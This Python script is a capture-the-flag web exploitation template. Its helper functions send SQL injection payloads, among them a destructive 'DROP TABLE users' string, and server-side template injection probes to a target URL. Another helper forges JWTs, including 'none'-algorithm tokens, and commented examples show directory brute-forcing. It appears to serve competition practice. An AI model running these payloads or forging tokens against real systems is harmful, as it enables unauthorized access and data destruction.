#!/usr/bin/env python3
"""
CTF Web Exploitation Template
================================
Domain : Web
Usage  : python solve.py [--target URL] [--file FILE] [--data DATA]
"""

import argparse
import re
import os
import sys
import hashlib
import base64
import json
import urllib.parse
import html
import string

# ── Optional imports (install if needed) ──────────────────────────────
try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError:
    print("[!] requests not installed — run: pip install requests")

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] beautifulsoup4 not installed — run: pip install beautifulsoup4")

try:
    from pwn import *
except ImportError:
    print("[!] pwntools not installed — run: pip install pwntools")

try:
    import jwt  # PyJWT
except ImportError:
    print("[!] PyJWT not installed — run: pip install PyJWT")


# ══════════════════════════════════════════════════════════════════════
# CONFIGURATION — Fill these in during the competition
# ══════════════════════════════════════════════════════════════════════
TARGET_URL   = ""          # e.g. "http://challenge.ctf.com:8080"
LOGIN_URL    = ""          # e.g. TARGET_URL + "/login"
FLAG_FORMAT  = r"FDC\{.*?\}"
COOKIES      = {}          # e.g. {"session": "abc123"}
HEADERS      = {
    "User-Agent": "Mozilla/5.0 (CTF Solver)",
}
PROXIES      = {
    # "http": "http://127.0.0.1:8080",   # Uncomment for Burp Suite
    # "https": "http://127.0.0.1:8080",
}


# ══════════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ══════════════════════════════════════════════════════════════════════
def read_file(path: str) -> bytes:
    """Read a local file and return raw bytes."""
    with open(path, "rb") as f:
        return f.read()


def create_session() -> requests.Session:
    """Create a persistent requests session with default headers."""
    s = requests.Session()
    s.headers.update(HEADERS)
    s.cookies.update(COOKIES)
    if PROXIES.get("http"):
        s.proxies.update(PROXIES)
        s.verify = False  # Disable SSL verification when proxying
    return s


def get(url: str, session: requests.Session = None, **kwargs) -> requests.Response:
    """Convenience GET request."""
    s = session or create_session()
    resp = s.get(url, **kwargs)
    print(f"[GET {resp.status_code}] {url}")
    return resp


def post(url: str, data=None, json_data=None, session: requests.Session = None, **kwargs) -> requests.Response:
    """Convenience POST request."""
    s = session or create_session()
    resp = s.post(url, data=data, json=json_data, **kwargs)
    print(f"[POST {resp.status_code}] {url}")
    return resp


def sqli_test(url: str, param: str, payloads: list = None):
    """Test a URL parameter with common SQL injection payloads."""
    default_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1; DROP TABLE users--",
        "admin'--",
        "' OR 1=1#",
        "\" OR \"\"=\"",
    ]
    payloads = payloads or default_payloads
    session = create_session()
    for payload in payloads:
        resp = get(url, session=session, params={param: payload})
        flags = find_flag(resp.text)
        if flags:
            print(f"[+] FLAG FOUND with payload: {payload}")
            print(f"    {flags}")
            return flags
        if len(resp.text) > 0:
            print(f"    payload={payload!r}  len={len(resp.text)}")
    return []


def ssti_test(url: str, param: str):
    """Test for Server-Side Template Injection."""
    payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__}}",
    ]
    session = create_session()
    for payload in payloads:
        resp = get(url, session=session, params={param: payload})
        if "49" in resp.text or "config" in resp.text.lower():
            print(f"[+] SSTI detected with: {payload}")
            print(f"    Response snippet: {resp.text[:200]}")
            return True
    return False


def forge_jwt(payload_dict: dict, secret: str = "", algorithm: str = "HS256") -> str:
    """Forge a JWT token (useful for 'none' algorithm or weak secrets)."""
    if algorithm.lower() == "none":
        return jwt.encode(payload_dict, key="", algorithm="HS256").rsplit(".", 1)[0] + "."
    return jwt.encode(payload_dict, key=secret, algorithm=algorithm)


def find_flag(text: str) -> list:
    """Extract flags from text using the configured flag format."""
    return re.findall(FLAG_FORMAT, text)


# ══════════════════════════════════════════════════════════════════════
# SOLVE LOGIC — Implement your solution here
# ══════════════════════════════════════════════════════════════════════
def solve(args):
    print("[*] Starting Web solve …")

    target = args.target or TARGET_URL
    if not target:
        print("[!] No target specified. Use -t <URL> or set TARGET_URL.")
        return

    session = create_session()

    # ── Load local file (if needed) ───────────────────────────────────
    if args.file:
        data = read_file(args.file)
        print(f"[+] Loaded {len(data)} bytes from {args.file}")

    # ── Initial recon ─────────────────────────────────────────────────
    print(f"[*] Fetching {target} …")
    resp = get(target, session=session)
    print(f"[+] Response length: {len(resp.text)}")

    # Check for flags in the initial response
    flags = find_flag(resp.text)
    if flags:
        print(f"[+] FLAG: {flags}")
        return

    # ── TODO: Write your web exploitation logic below ─────────────────
    #
    # Example: SQL Injection scan
    #   sqli_test(target + "/search", param="q")
    #
    # Example: SSTI test
    #   ssti_test(target + "/render", param="name")
    #
    # Example: Directory brute-force
    #   wordlist = ["admin", "flag", "robots.txt", ".git/HEAD", "backup"]
    #   for word in wordlist:
    #       r = get(f"{target}/{word}", session=session)
    #       if r.status_code == 200:
    #           print(f"  [+] Found: /{word}")
    #
    # Example: JWT forgery
    #   token = forge_jwt({"user": "admin", "role": "admin"}, secret="weak")
    #   session.cookies.set("token", token)
    #

    print("[*] Done.")


# ══════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Web Exploitation CTF Solver")
    parser.add_argument("-t", "--target", help="Target URL")
    parser.add_argument("-f", "--file",   help="Path to local file (e.g. wordlist)")
    parser.add_argument("-d", "--data",   help="Inline data / payload string")
    args = parser.parse_args()
    solve(args)
